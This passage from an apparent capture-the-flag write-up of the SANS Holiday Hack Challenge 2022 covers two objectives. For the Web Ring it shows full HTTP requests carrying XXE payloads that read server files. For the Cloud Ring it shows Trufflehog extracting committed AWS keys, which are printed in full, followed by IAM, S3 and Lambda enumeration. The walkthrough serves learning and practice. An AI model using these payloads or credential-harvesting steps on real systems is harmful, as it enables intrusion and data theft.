     <imgDrop>&example;</imgDrop>
      <who>princess</who>
      <reqType>xml</reqType>
    </root>

.. code-block:: http

    HTTP/1.1 200 OK
    Server: Werkzeug/2.2.2 Python/3.10.8
    Date: Thu, 05 Jan 2023 13:39:56 GMT
    Content-Type: application/json
    Content-Length: 274
    Set-Cookie: MiniLembanh=408dde46-71cf-440e-a273-f801f09c640c.-A_2od6HzDxSWK9x5SxwJURAsao; Domain=glamtarielsfountain.com; Path=/
    Via: 1.1 google
    Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

    {
      "appResp": "I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
      "droppedOn": "none",
      "visit": "none"
    }

Hmm, nothing, let's see with the red ring:

.. code-block:: http
    :hl_lines: 20

    POST /dropped HTTP/1.1
    Host: glamtarielsfountain.com
    Cookie: GCLB="245893ca62dcb86d"; MiniLembanh=408dde46-71cf-440e-a273-f801f09c640c.-A_2od6HzDxSWK9x5SxwJURAsao
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
    Accept: application/xml
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/xml
    X-Grinchum: Ijc0MzU2YzI1NTU1NmJhMjQ2Mzc4NjYzMWYwNTg1N2ViNmYyNmFkMWUi.Y7bJLw.CoFMFSmUXQ7Ke7ol0JnKxs88EbE
    Content-Length: 268
    Origin: https://glamtarielsfountain.com
    Referer: https://glamtarielsfountain.com/
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers

    <?xml version="1.0" encoding="UTF-8" ?>
    <!DOCTYPE foo [
    <!ENTITY example SYSTEM "file:///app/static/images/x_phial_pholder_2022/redring.txt">
    ]>
    <root>
     <imgDrop>&example;</imgDrop>
      <who>princess</who>
      <reqType>xml</reqType>
    </root>

.. code-block:: http

    HTTP/1.1 200 OK
    Server: Werkzeug/2.2.2 Python/3.10.8
    Date: Thu, 05 Jan 2023 13:39:40 GMT
    Content-Type: application/json
    Content-Length: 223
    Set-Cookie: MiniLembanh=408dde46-71cf-440e-a273-f801f09c640c.-A_2od6HzDxSWK9x5SxwJURAsao; Domain=glamtarielsfountain.com; Path=/
    Via: 1.1 google
    Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

    {
      "appResp": "Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice.^Oooooh, I can just tell she'd like to talk about them some more.",
      "droppedOn": "none",
      "visit": "none"
    }

Still nothing... What about the silver ring? Glamtariel does not have one,
let's see what she has to say about it:

.. code-block:: http
    :hl_lines: 20

    POST /dropped HTTP/1.1
    Host: glamtarielsfountain.com
    Cookie: GCLB="245893ca62dcb86d"; MiniLembanh=408dde46-71cf-440e-a273-f801f09c640c.-A_2od6HzDxSWK9x5SxwJURAsao
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
    Accept: application/xml
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/xml
    X-Grinchum: Ijc0MzU2YzI1NTU1NmJhMjQ2Mzc4NjYzMWYwNTg1N2ViNmYyNmFkMWUi.Y7bJLw.CoFMFSmUXQ7Ke7ol0JnKxs88EbE
    Content-Length: 271
    Origin: https://glamtarielsfountain.com
    Referer: https://glamtarielsfountain.com/
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers

    <?xml version="1.0" encoding="UTF-8" ?>
    <!DOCTYPE foo [
    <!ENTITY example SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt">
    ]>
    <root>
     <imgDrop>&example;</imgDrop>
      <who>princess</who>
      <reqType>xml</reqType>
    </root>

.. code-block:: http
    :hl_lines: 13

    HTTP/1.1 200 OK
    Server: Werkzeug/2.2.2 Python/3.10.8
    Date: Thu, 05 Jan 2023 13:40:12 GMT
    Content-Type: application/json
    Content-Length: 368
    Set-Cookie: MiniLembanh=408dde46-71cf-440e-a273-f801f09c640c.-A_2od6HzDxSWK9x5SxwJURAsao; Domain=glamtarielsfountain.com; Path=/
    Via: 1.1 google
    Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

    {
      "appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",
      "droppedOn": "none",
      "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
    }

We get a picture of the red ring but...

.. image:: /images/sans-christmas-challenge-2022/redring-supersupersecret928164.png
    :alt: Glamtariel's red ring, but something is written on it.
    :align: center

The inside of the red ring reads :code:`goldring_to_be_deleted.txt`. Let's ask
Glamtariel about this interesting file:

.. code-block:: http
    :hl_lines: 20

    POST /dropped HTTP/1.1
    Host: glamtarielsfountain.com
    Cookie: GCLB="245893ca62dcb86d"; MiniLembanh=408dde46-71cf-440e-a273-f801f09c640c.-A_2od6HzDxSWK9x5SxwJURAsao
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
    Accept: application/xml
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/xml
    X-Grinchum: Ijc0MzU2YzI1NTU1NmJhMjQ2Mzc4NjYzMWYwNTg1N2ViNmYyNmFkMWUi.Y7bJLw.CoFMFSmUXQ7Ke7ol0JnKxs88EbE
    Content-Length: 283
    Origin: https://glamtarielsfountain.com
    Referer: https://glamtarielsfountain.com/
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers

    <?xml version="1.0" encoding="UTF-8" ?>
    <!DOCTYPE foo [
    <!ENTITY example SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">
    ]>
    <root>
     <imgDrop>&example;</imgDrop>
      <who>princess</who>
      <reqType>xml</reqType>
    </root>

.. code-block:: http

    HTTP/1.1 200 OK
    Server: Werkzeug/2.2.2 Python/3.10.8
    Date: Thu, 05 Jan 2023 13:40:26 GMT
    Content-Type: application/json
    Content-Length: 333
    Set-Cookie: MiniLembanh=408dde46-71cf-440e-a273-f801f09c640c.-A_2od6HzDxSWK9x5SxwJURAsao; Domain=glamtarielsfountain.com; Path=/
    Via: 1.1 google
    Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

    {
      "appResp": "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.",
      "droppedOn": "none",
      "visit": "none"
    }

Hmm, two new capitalized words: :code:`REQ` and :code:`TYPE`. She's giving us
a clue about the :code:`reqType` parameter. Maybe we should try triggering the
XXE with the :code:`reqType` parameter. She's also asking for a silver ring in
exchange. If you remember, the silver ring was :code:`img1`. Let's send
:code:`img1` and trigger the XXE in :code:`reqType`:

.. code-block:: http
    :hl_lines: 20 23 25

    POST /dropped HTTP/1.1
    Host: glamtarielsfountain.com
    Cookie: GCLB="245893ca62dcb86d"; MiniLembanh=03a5bb54-8add-4ddd-be89-358a7c0190a8.9h2D9t5bC9rE7URTCfuM0bVr0qM
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
    Accept: application/xml
    Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/xml
    X-Grinchum: IjdmNmM4M2VjZGEzZDc4YmFhYjA0YzU5YThkOGEwNDgxNDdlNTdmZTIi.Y7bXXw.jmgvyTtU6Y5LRouZtg0MMYAHdSo
    Content-Length: 260
    Origin: https://glamtarielsfountain.com
    Referer: https://glamtarielsfountain.com/
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers

    <?xml version="1.0" encoding="UTF-8" ?>
    <!DOCTYPE foo [
    <!ENTITY example SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">
    ]>
    <root>
     <imgDrop>img1</imgDrop>
      <who>princess</who>
      <reqType>&example;</reqType>
    </root>

.. code-block:: http
    :hl_lines: 13

    HTTP/1.1 200 OK
    Server: Werkzeug/2.2.2 Python/3.10.8
    Date: Thu, 05 Jan 2023 14:45:29 GMT
    Content-Type: application/json
    Content-Length: 593
    Set-Cookie: MiniLembanh=03a5bb54-8add-4ddd-be89-358a7c0190a8.9h2D9t5bC9rE7URTCfuM0bVr0qM; Domain=glamtarielsfountain.com; Path=/
    Via: 1.1 google
    Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

    {
      "appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",
      "droppedOn": "none",
      "visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
    }

We finally get our golden ring, with file name
:code:`goldring-morethansupertopsecret76394734.png`:

.. image:: /images/sans-christmas-challenge-2022/goldring-morethansupertopsecret76394734.png
    :alt: The golden ring. It has three white stars on it.
    :align: center

Phew, that's done! I want to thank the people in the HHC Discord server for
their help, especially MichelleB, elakamarcus, and DP. They were able to nudge
me in the right directions and confirm my theories without spoiling anything.
Team work makes the dream work.

.. image:: /images/sans-christmas-challenge-2022/akbowl.png
    :alt: Akbowl, same image as before.
    :align: center

*Akbowl says*

    No! That's not yours!

    This birdbath showed me images of this happening.

    But I didn't believe it because nobody is better than Akbowl!

    Akbowl's head is the hardest! That's what the other sporcs tell me.

    I guess Akbowl's head is not the smartest.

Don't be mad, Akbowl, but we get the third ring: the Web Ring:

.. image:: /images/sans-christmas-challenge-2022/web_ring.png
    :alt: The Tolkien Ring. It's a simple golden ring, like the one from Lord
        of the Rings, etched with an XSS payload and a JavaScript alert pop-up.
    :align: center

Right next to the fountain, Grinchum is fuming:

.. image:: /images/sans-christmas-challenge-2022/smeagolmad2.png
    :alt: Grinchum, still frowning.
    :align: center

*Grinchum says*

    😏 *First lost... second lost... third lost.* 😟

    *Where are they?* 😦 *WHERE ARE THEY, preciouses?*

    *No! Aaargh! Lost!*

    😖 **You - naggy human. Musn't bother us.** 😱 **Not its business!**
    *grinchum..grinchum*

Recover the Cloud Ring
~~~~~~~~~~~~~~~~~~~~~~

Down and down we go, where we meet our first two Sporcs!

.. image:: /images/sans-christmas-challenge-2022/brozeek.png
    :alt: Brozeek is a Sporc. Basically an orc: Green skin, square jaw, bald
        head. He's wearing a long red coat, black pants, black snow shoes,
        a giant black belt with a golden buckle across his chest, and two
        spaulders.
    :align: center

*Brozeek says*

    Cro! Slicmer got me on the BSRS pre-sale!

    Now all we gotta do is swap outfits, then you can go back in there as me.

    Tell Slicmer you lost your wallet key, so you made a new wallet and need to
    add it to the list.

    Then give him your wallet address, and we'll both be able to buy an NFT!

    Social engineering at its finest, Cro.

.. image:: /images/sans-christmas-challenge-2022/crozag.png
    :alt: Crozag is a Sporc wearing a red toga, black snow shoes, white fur
        shoulder pads, and a breastplate.
    :align: center

*Crozag says*

    Bro, you usually have good ideas, but this one is really terrible.

    Manipulating friends with social engineering isn't cool, Bro.

    Let's do it!

Looks like there's a cryptocoin pre-sale going on and these two Sporcs want in
on it. Let's put a pin on it for now and go on.

AWS CLI Intro
-------------

We enter the Cloud Ring room, and find Jill Underpole:

.. image:: /images/sans-christmas-challenge-2022/jillunderpole.png
    :alt: Jill Underpole is a Flobbit with black skin and curly dark hair. She
        is wearing a green dress with white sleeves, a white apron, and a red
        cape.
    :align: center

*Jill Underpole says*

    Umm, can I help you?

    Me? I'm Jill Underpole, thank you very much.

    I'm working on this here smoke terminal.

    Cloud? Sure, whatever you want to call it.

    Anyway, you're welcome to try this out, if you think you know what you're
    doing.

    You'll have to learn some basics about the AWS command line interface (CLI)
    to be successful though.

Let's connect to the terminal and answer the questions:

.. code-block:: text

    You may not know this, but AWS CLI help messages are very easy to access. First, try typing:
    $ aws help

.. code-block:: console

    elf@4c2c76400f83:~$ aws help

.. code-block:: text

    Great! When you're done, you can quit with q.
    Next, please configure the default aws cli credentials with the access key AKQAAYRKO7A5Q5XUY2IY, the secret key qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf and the region us-east-1 .
    https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-config

.. code-block:: console

    elf@4c2c76400f83:~$ aws configure
    AWS Access Key ID [None]: AKQAAYRKO7A5Q5XUY2IY
    AWS Secret Access Key [None]: qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf
    Default region name [None]: us-east-1
    Default output format [None]:

.. code-block:: text

    Excellent! To finish, please get your caller identity using the AWS command line. For more details please reference:
    $ aws sts help
    or reference:
    https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/index.html

.. code-block:: console

    elf@4c2c76400f83:~$ aws sts get-caller-identity
    {
        "UserId": "AKQAAYRKO7A5Q5XUY2IY",
        "Account": "602143214321",
        "Arn": "arn:aws:iam::602143214321:user/elf_helpdesk"
    }

.. code-block:: text

    Great, you did it all!

Having answered all the questions, we talk to Jill:

.. image:: /images/sans-christmas-challenge-2022/jillunderpole.png
    :alt: Jill Underpole, same image as before.
    :align: center

*Jill Underpole says*

    Wait, you got it done, didn't you?

    Ok, consider me impressed. You could probably help Gerty, too.

    The first trick'll be running the Trufflehog tool.

    It's as good at sniffing out secrets as I am at finding mushrooms!

    After that, it's just a matter of getting to the secret the tool found.

    I'd bet a basket of portobellos you'll get this done!

Trufflehog Search
-----------------

.. image:: /images/sans-christmas-challenge-2022/gertysnowburrow.png
    :alt: Gerty Snowburrow is a Flobbit with white skin and shoulder-length
        blond hair. She's wearing a red ress with white sleeves, and a green
        cape.
    :align: center

*Gerty Snowburrow says*

    Well now, look who's venturing down into the caves!

    And well, who might you be, exactly?

    I'm Gerty Snowburrow, if you need to know.

    And, not that I should be telling you, but I'm trying to figure out what
    Alabaster Snowball's done this time.

    Word is, he committed some secrets to `a code repo <https://haugfactory.com/asnowball/aws_scripts.git>`__.

    If you're feeling so inclined, you can try and find them for me

The name of the objective is clearly an indication to use `Trufflehog
<https://github.com/trufflesecurity/trufflehog>`__, a tool to find common
secrets in several locations (S3 buckets, Git repositories or commits, etc.).

Let's run :code:`trufflehog git` on the Git URL Gerty gives us:

.. code-block:: console
    :hl_lines: 5 6 7 8 9

    $ ~/tools/trufflehog/trufflehog git https://haugfactory.com/orcadmin/aws_scripts
    🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

    Found unverified result 🐷🔑❓
    Detector Type: AWS
    Decoder Type: PLAIN
    Raw result: AKIAAIDAYRANYAHGQOHD
    Commit: 106d33e1ffd53eea753c1365eafc6588398279b5
    File: put_policy.py
    Email: asnowball <alabaster@northpolechristmastown.local>
    Repository: https://haugfactory.com/orcadmin/aws_scripts
    Timestamp: 2022-09-07 07:53:12 -0700 -0700
    Line: 6

    Found unverified result 🐷🔑❓
    Detector Type: Gitlab
    Decoder Type: PLAIN
    Raw result: add-a-file-using-the-
    Repository: https://haugfactory.com/orcadmin/aws_scripts
    Timestamp: 2022-09-06 19:54:48 +0000 +0000
    Line: 14
    Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85
    File: README.md
    Email: alabaster snowball <alabaster@northpolechristmastown.local>

    Found unverified result 🐷🔑❓
    Detector Type: Gitlab
    Decoder Type: BASE64
    Raw result: add-a-file-using-the-
    Email: alabaster snowball <alabaster@northpolechristmastown.local>
    Repository: https://haugfactory.com/orcadmin/aws_scripts
    Timestamp: 2022-09-06 19:54:48 +0000 +0000
    Line: 14
    Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85
    File: README.md

Looks like Alabaster commited an AWS secret to the :code:`put_policy.py` file.

.. image:: /images/sans-christmas-challenge-2022/gertysnowburrow.png
    :alt: Gerty Snowburrow, same image as before.
    :align: center

*Gerty Snowburrow says*

    Say, you got it done, didn't you?

    Well now, you might just be able to tackle the other AWS terminal down
    here.

    It's a bit more involved, but you've got the credentials to get it started
    now.

    Before you try it, you should know the difference between managed and
    inline policies.

    Short version: inline policies apply to one identity (user, role, group),
    and managed policies can be attached to many identities.

    There are different AWS CLI commands to interact with each kind.

    Other than that, the important bit is to know a bit about cloud or IAM
    privilege escalation.

    Sometimes attackers find access to more resources by just trying things
    until something works.

    But if they have access to the iam service inside the AWS CLI, they might
    just be able to ask what access they have!

    You can do it!

Exploitation via AWS CLI
------------------------

.. image:: /images/sans-christmas-challenge-2022/sulfrod.png
    :alt: Sulfrod is a Sporc with long dark green hair. She's wearing a silver
        armor with a red tabard and a black belt with a golden buckle.
    :align: center

*Sulfrod says*

    Hey! You - come here!

    You look like someone who knows how to do this nerd stuff.

    I need my terminal to be stronger, like me!

    *flexes*

    You're gonna do that for me so I can bust into this cloud machine thing.

Let's try to get the ring before she can. To complete this challenge, we must
enter a series of AWS functions. The questions always point to the `AWS
documentation <https://awscli.amazonaws.com/v2/documentation/api/latest/reference/index.html>`__.
It should be easy to find the proper function.

.. code-block:: text

    Use Trufflehog to find credentials in the Gitlab instance at https://haugfactory.com/asnowball/aws_scripts.git.
    Configure these credentials for us-east-1 and then run:
    $ aws sts get-caller-identity

We ran Trufflehog in the last objective. It gave us the commit and the file
containing the AWS secret. Let's clone the repository and check it out:

*(Note: the URL is different because the one given by Gerty gives an HTTP
redirection. Also, sorry for ze French output, my computer is configured in
French.)*

.. code-block:: console
    :hl_lines: 28 29

    $ git clone https://haugfactory.com/orcadmin/aws_scripts
    Clonage dans 'aws_scripts'...
    warning: redirection vers https://haugfactory.com/orcadmin/aws_scripts.git/
    remote: Enumerating objects: 64, done.
    remote: Total 64 (delta 0), reused 0 (delta 0), pack-reused 64
    Dépaquetage des objets: 100% (64/64), 23.83 Kio | 739.00 Kio/s, fait.
    $ cd aws_scripts
    $ git checkout 106d33e1ffd53eea753c1365eafc6588398279b5
    Note : basculement sur '106d33e1ffd53eea753c1365eafc6588398279b5'.

    Vous êtes dans l'état « HEAD détachée ». Vous pouvez visiter, faire des modifications
    expérimentales et les valider. Il vous suffit de faire un autre basculement pour
    abandonner les commits que vous faites dans cet état sans impacter les autres branches

    Si vous voulez créer une nouvelle branche pour conserver les commits que vous créez,
    il vous suffit d'utiliser l'option -c de la commande switch comme ceci :

      git switch -c <nom-de-la-nouvelle-branche>

    Ou annuler cette opération avec :

      git switch -

    Désactivez ce conseil en renseignant la variable de configuration advice.detachedHead à false

    HEAD est maintenant sur 106d33e added
    $ grep aws_ put_policy.py
    aws_access_key_id="AKIAAIDAYRANYAHGQOHD",
    aws_secret_access_key="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",

We now have the secret access key and the key ID, we can configure it in our
AWS CLI:

.. code-block:: console
    :hl_lines: 10

    elf@80c2de61d99b:~$ aws configure
    AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD
    AWS Secret Access Key [None]: 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
    Default region name [None]: us-east-1
    Default output format [None]:
    elf@80c2de61d99b:~$ aws sts get-caller-identity
    {
        "UserId": "AIDAJNIAAQYHIAAHDDRA",
        "Account": "602123424321",
        "Arn": "arn:aws:iam::602123424321:user/haug"
    }

.. code-block:: text

    Managed (think: shared) policies can be attached to multiple users. Use the AWS CLI to find any policies attached to your user.
    The aws iam command to list attached user policies can be found here:
    https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
    Hint: it is NOT list-user-policies.

We know from our previous command that our username is :code:`haug`.

.. code-block:: console
    :hl_lines: 6 18

    elf@80c2de61d99b:~$ aws iam list-attached-user-policies --user-name haug
    {
        "AttachedPolicies": [
            {
                "PolicyName": "TIER1_READONLY_POLICY",
                "PolicyArn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
            }
        ],
        "IsTruncated": false
    }
    elf@80c2de61d99b:~$ aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY
    {
        "Policy": {
            "PolicyName": "TIER1_READONLY_POLICY",
            "PolicyId": "ANPAYYOROBUERT7TGKUHA",
            "Arn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY",
            "Path": "/",
            "DefaultVersionId": "v1",
            "AttachmentCount": 11,
            "PermissionsBoundaryUsageCount": 0,
            "IsAttachable": true,
            "Description": "Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.",
            "CreateDate": "2022-06-21 22:02:30+00:00",
            "UpdateDate": "2022-06-21 22:10:29+00:00",
            "Tags": []
        }
    }

.. code-block:: text

    Attached policies can have multiple versions. View the default version of this policy.
    The aws iam command to get a policy version can be found here:
    https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html

We know from our previous command that the default version is :code:`v1`.

.. code-block:: console

    elf@80c2de61d99b:~$ aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1
    {
        "PolicyVersion": {
            "Document": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Action": [
                            "lambda:ListFunctions",
                            "lambda:GetFunctionUrlConfig"
                        ],
                        "Resource": "*"
                    },
                    {
                        "Effect": "Allow",
                        "Action": [
                            "iam:GetUserPolicy",
                            "iam:ListUserPolicies",
                            "iam:ListAttachedUserPolicies"
                        ],
                        "Resource": "arn:aws:iam::602123424321:user/${aws:username}"
                    },
                    {
                        "Effect": "Allow",
                        "Action": [
                            "iam:GetPolicy",
                            "iam:GetPolicyVersion"
                        ],
                        "Resource": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
                    },
                    {
                        "Effect": "Deny",
                        "Principal": "*",
                        "Action": [
                            "s3:GetObject",
                            "lambda:Invoke*"
                        ],
                        "Resource": "*"
                    }
                ]
            },
            "VersionId": "v1",
            "IsDefaultVersion": false,
            "CreateDate": "2022-06-21 22:02:30+00:00"
        }
    }

.. code-block:: text

    Inline policies are policies that are unique to a particular identity or resource. Use the AWS CLI to list the inline policies associated with your user.
    The aws iam command to list user policies can be found here:
    https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
    Hint: it is NOT list-attached-user-policies.

.. code-block:: console
    :hl_lines: 4

    elf@80c2de61d99b:~$ aws iam list-user-policies --user-name haug
    {
        "PolicyNames": [
            "S3Perms"
        ],
        "IsTruncated": false
    }

.. code-block:: text

    Now, use the AWS CLI to get the only inline policy for your user.
    The aws iam command to get a user policy can be found here:
    https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html

.. code-block:: console
    :hl_lines: 15 16

    elf@80c2de61d99b:~$ aws iam get-user-policy --user-name haug --policy-name S3Perms
    {
        "UserPolicy": {
            "UserName": "haug",
            "PolicyName": "S3Perms",
            "PolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Action": [
                            "s3:ListObjects"
                        ],
                        "Resource": [
                            "arn:aws:s3:::smogmachines3",
                            "arn:aws:s3:::smogmachines3/*"
                        ]
                    }
                ]
            }
        },
        "IsTruncated": false
    }

.. code-block:: text

    The inline user policy named S3Perms disclosed the name of an S3 bucket that you have permissions to list objects.
    List those objects!
    The aws s3api command to list objects in an s3 bucket can be found here:
    https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3api/index.html

We know from our previous command that the S3 bucket is named
:code:`smogmachines3`.

.. code-block:: console

    elf@80c2de61d99b:~$ aws s3api list-objects --bucket smogmachines3
    {
        "IsTruncated": false,
        "Marker": "",
        "Contents": [
            {
                "Key": "coal-fired-power-station.jpg",
                "LastModified": "2022-09-23 20:40:44+00:00",
                "ETag": "\"1c70c98bebaf3cff781a8fd3141c2945\"",
                "Size": 59312,
                "StorageClass": "STANDARD",
                "Owner": {
                    "DisplayName": "grinchum",
                    "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
                }
            },
            {
                "Key": "industry-smog.png",
                "LastModified": "2022-09-23 20:40:47+00:00",
                "ETag": "\"c0abe5cb56b7a33d39e17f430755e615\"",
                "Size": 272528,
                "StorageClass": "STANDARD",
                "Owner": {
                    "DisplayName": "grinchum",
                    "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
                }
            },
            {
                "Key": "pollution-smoke.jpg",
                "LastModified": "2022-09-23 20:40:43+00:00",
                "ETag": "\"465b675c70d73027e13ffaec1a38beec\"",
                "Size": 33064,
                "StorageClass": "STANDARD",
                "Owner": {
                    "DisplayName": "grinchum",
                    "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
                }
            },
            {
                "Key": "pollution.jpg",
                "LastModified": "2022-09-23 20:40:45+00:00",
                "ETag": "\"d40d1db228c9a9b544b4c552df712478\"",
                "Size": 81775,
                "StorageClass": "STANDARD",
                "Owner": {
                    "DisplayName": "grinchum",
                    "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
                }
            },
            {
                "Key": "power-station-smoke.jpg",
                "LastModified": "2022-09-23 20:40:48+00:00",
                "ETag": "\"2d7a8c8b8f5786103769e98afacf57de\"",
                "Size": 45264,
                "StorageClass": "STANDARD",
                "Owner": {
                    "DisplayName": "grinchum",
                    "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
                }
            },
            {
                "Key": "smog-power-station.jpg",
                "LastModified": "2022-09-23 20:40:46+00:00",
                "ETag": "\"0e69b8d53d97db0db9f7de8663e9ec09\"",
                "Size": 32498,
                "StorageClass": "STANDARD",
                "Owner": {
                    "DisplayName": "grinchum",
                    "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
                }
                        },
            {
                "Key": "smogmachine_lambda_handler_qyJZcqvKOthRMgVrAJqq.py",
                "LastModified": "2022-09-26 16:31:33+00:00",
                "ETag": "\"fd5d6ab630691dfe56a3fc2fcfb68763\"",
                "Size": 5823,
                "StorageClass": "STANDARD",
                "Owner": {
                    "DisplayName": "grinchum",
                    "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
                }
            }
        ],
        "Name": "smogmachines3",
        "Prefix": "",
        "MaxKeys": 1000,
        "EncodingType": "url"
    }

.. code-block:: text

    The attached user policy provided you several Lambda privileges. Use the AWS CLI to list Lambda functions.
    The aws lambda command to list functions can be found here:
    https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html

.. code-block:: console
    :hl_lines: 5

    elf@80c2de61d99b:~$ aws lambda list-functions
    {
        "Functions": [
            {
                "FunctionName": "smogmachine_lambda",
                "FunctionArn": "arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda",
                "Runtime": "python3.9",
                "Role": "arn:aws:iam::602123424321:role/smogmachine_lambda",
                "Handler": "handler.lambda_handler",
                "CodeSize": 2126,
                "Description": "",
                "Timeout": 600,
                "MemorySize": 256,
                "LastModified": "2022-09-07T19:28:23.634+0000",
                "CodeSha256": "GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=",
                "Version": "$LATEST",
                "VpcConfig": {
                    "SubnetIds": [
                        "subnet-8c80a9cb8b3fa5505"
                    ],
                    "SecurityGroupIds": [
                        "sg-b51a01f5b4711c95c"
                    ],
                    "VpcId": "vpc-85ea8596648f35e00"
                },
                "Environment": {
                    "Variables": {
                        "LAMBDASECRET": "975ceab170d61c75",
                        "LOCALMNTPOINT": "/mnt/smogmachine_files"
                    }
                },
                "TracingConfig": {
                    "Mode": "PassThrough"
                },
                "RevisionId": "7e198c3c-d4ea-48dd-9370-e5238e9ce06e",
                "FileSystemConfigs": [
                    {
                        "Arn": "arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/fsap-db3277b03c6e975d2",
                        "LocalMountPath": "/mnt/smogmachine_files"
                    }
                ],
                "PackageType": "Zip",
                "Architectures": [
                    "x86_64"
                ],
                "EphemeralStorage": {
                    "Size": 512
                }
            }
        ]
    }

.. code-block:: text

    Lambda functions can have public URLs from which they are directly accessible.
    Use the AWS CLI to get the configuration containing the public URL of the Lambda function.
    The aws lambda command to get the function URL config can be found here:
    https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html

We know from our previous command that the lambda function is named
:code:`smogmachine_lambda`.

.. code-block:: console

    elf@80c2de61d99b:~$ aws lambda get-function-url-config --function-name smogmachine_lambda
    {
        "FunctionUrl": "https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/",
        "FunctionArn": "arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda",
        "AuthType": "AWS_IAM",
        "Cors": {
            "AllowCredentials": false,
            "AllowHeaders": [],
            "AllowMethods": [
                "GET",
                "POST"
            ],
            "AllowOrigins": [
                "*"
            ],
            "ExposeHeaders": [],
            "MaxAge": 0
        },
        "CreationTime": "2022-09-07T19:28:23.808713Z",
        "LastModifiedTime": "2022-09-07T19:28:23.808713Z"
    }

.. code-block:: text

    Great, you did it all - thank you!

This gives us our fourth ring, the Cloud Ring:

.. image:: /images/sans-christmas-challenge-2022/cloud_ring.png
